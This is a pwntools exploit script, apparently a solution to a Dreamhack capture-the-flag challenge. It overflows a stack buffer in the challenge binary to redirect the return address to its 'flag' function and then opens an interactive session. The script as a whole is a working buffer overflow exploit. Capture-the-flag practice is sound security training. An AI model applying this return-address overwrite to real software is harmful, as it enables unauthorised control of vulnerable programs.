from pwn import *

p = remote('host3.dreamhack.games', 11388)
e = ELF('./chall')

flag = e.symbols['flag']
buf = b'cherry' + b'AAAAAA' + b'Z'

p.sendafter(b'Menu: ', buf)

fruit = b'cherry' + b'A' * 0xc + b'B' * 0x8 + p64(flag)
p.sendafter(b'Is it cherry?: ', fruit)

p.interactive()